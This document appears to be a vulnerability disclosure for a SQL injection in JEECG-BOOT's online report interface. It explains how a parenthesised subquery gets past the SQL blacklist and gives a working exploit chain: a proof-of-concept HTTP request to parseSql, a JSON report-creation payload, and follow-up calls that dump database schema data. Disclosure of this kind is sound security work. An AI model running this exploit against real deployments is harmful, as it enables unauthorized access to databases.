# JEECG-BOOT v3.8 -SQL Injection



##### Version：

3.4.3<= version <= 3.8.0

##### Info：

​		The online report interface of Jeecgboot,  `/jeecg-boot/online/cgreport/head/parseSql`, has a problem with improper  handling of subquery statements. This leads to bypassing the SQL  injection blacklist restrictions and causing SQL injection.

##### Case：

​		In  `org.jeecg.common.util.security.AbstractQueryBlackListHandler.isPass()`,  the code `list = this.getQueryTableInfo(sql.toLowerCase())` does not check the object type and directly performs a forced type conversion. By  constructing a malicious subquery statement to throw an exception, the  SQL blacklist restriction can be bypassed, resulting in the ` list `   variable being  `null`  and successfully passing the SQL verification, thus  causing a SQL injection vulnerability.

##### POC：

```http
GET /jeecg-boot/online/cgreport/head/parseSql?
sql=select%20schema_name%20from%20(information_schema.schemata)&_t=1748025423668 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: ey.......(Must be obtained jwt through login or unauthorized vulnerabilities)
X-Tenant-Id: 3
Connection: keep-alive
```

##### Vulnerability：

Vulnerability interface：

```
/jeecg-boot/online/cgreport/head/parseSql?sql=select+schema_name+from+(information_schema.schemata)
```

After constructing a subquery statement and passing it into the SQL  parameter, it is found that during the list assignment phase, an  exception can be thrown to skip the blacklist detection, thereby making `list == null` directly return true and achieving the bypass of SQL  blacklist statement detection.
[![Image](https://private-user-images.githubusercontent.com/93909093/447129534-093eec34-dcc6-4c22-a347-41d274f971c6.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTUyMjU3MzcsIm5iZiI6MTc1NTIyNTQzNywicGF0aCI6Ii85MzkwOTA5My80NDcxMjk1MzQtMDkzZWVjMzQtZGNjNi00YzIyLWEzNDctNDFkMjc0Zjk3MWM2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA4MTUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwODE1VDAyMzcxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU4Yjg1OTMzODI4NzA3OGRjZmM1Yzk2ZDFlZGY3NmVlMDc3ZDIzNTc4NDE3Njk2OGNhMTI1ZDVlMjVlZmRmNjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.U52UnHiTXpp9NoS0R7Oh5NMO8s77VtGoEDHUJktkhnw)](https://private-user-images.githubusercontent.com/93909093/447129534-093eec34-dcc6-4c22-a347-41d274f971c6.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTUyMjU3MzcsIm5iZiI6MTc1NTIyNTQzNywicGF0aCI6Ii85MzkwOTA5My80NDcxMjk1MzQtMDkzZWVjMzQtZGNjNi00YzIyLWEzNDctNDFkMjc0Zjk3MWM2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA4MTUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwODE1VDAyMzcxN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU4Yjg1OTMzODI4NzA3OGRjZmM1Yzk2ZDFlZGY3NmVlMDc3ZDIzNTc4NDE3Njk2OGNhMTI1ZDVlMjVlZmRmNjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.U52UnHiTXpp9NoS0R7Oh5NMO8s77VtGoEDHUJktkhnw)

`sql=select+chema_name+from+information_schema.schemata`，It is prompted that there is a risk of SQL injection.

![image-20250815105719117](https://github.com/R4gd0ll/R4gd0ll.github.io/blob/main/2025/image-20250815105719117.png)

But，`sql=select+schema_name+from+(information_schema.schemata)`，Prompt: Parsing successful.

![image-20250815105956788](https://github.com/R4gd0ll/R4gd0ll.github.io/blob/main/2025/image-20250815105956788.png)

To construct parameters for `/jeecg-boot/online/cgreport/head/add` where the `items` parameter is derived from the processing result of `/jeecg-boot/online/cgreport/head/parseSql?sql=select+schema_name+from+(information_schema.schemata)`, you can follow this approach

```json
{"head":{"code":"test123","name":"test123","cgrSql":"select schema_name from (information_schema.schemata)"},"params":[],"items":[{"fieldName":"schema_name","fieldTxt":"schema_name","orderNum":1,"id":"1956187268521541634","fieldType":"String","isShow":1}]}
```

![image-20250815110244390](https://github.com/R4gd0ll/R4gd0ll.github.io/blob/main/2025/image-20250815110244390.png)

After a successful addition, you can access the interface to view the `id` value of the `test123` report.

```http
/jeecg-boot/online/cgreport/head/list?&name=test123
```

![image-20250815110355675](https://github.com/R4gd0ll/R4gd0ll.github.io/blob/main/2025/image-20250815110355675.png)

Finally, you can access it by appending the report ID to `/jeecg-boot/online/cgreport/api/getColumnsAndData`, thereby bypassing the SQL blacklist to achieve SQL injection.

```http
/jeecg-boot/online/cgreport/api/getColumnsAndData/1956188883152420865?pageSize=1000000000
```

![image-20250815110650727](https://github.com/R4gd0ll/R4gd0ll.github.io/blob/main/2025/image-20250815110650727.png)
